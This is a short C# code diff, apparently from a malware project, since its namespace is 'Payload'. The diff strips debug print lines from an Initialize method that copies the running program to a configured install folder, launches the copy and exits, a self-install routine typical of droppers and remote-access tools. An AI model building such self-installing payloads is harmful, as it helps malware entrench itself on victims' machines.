@@ -39,30 +39,21 @@ namespace Payload {
 
         public void Initialize() {
             try {
-                Console.WriteLine("2");
                 if (Config.InstallPath == System.Reflection.Assembly.GetEntryAssembly().Location) {
                     return;
                 }
-                Console.WriteLine("3");
 
                 if (!Directory.Exists(Config.InstallFolder)) {
                     Directory.CreateDirectory(Config.InstallFolder);
                 }
-                Console.WriteLine("4");
 
                 try {
                     File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, Config.InstallPath, true);
                 } catch { }
 
-                Console.WriteLine("5");
-
                 Process.Start(Config.InstallPath);
 
-                Console.WriteLine("6");
-
                 Environment.Exit(0);
-
-                Console.WriteLine("7");
             } catch (Exception e) {
                 Console.WriteLine(e);
             }
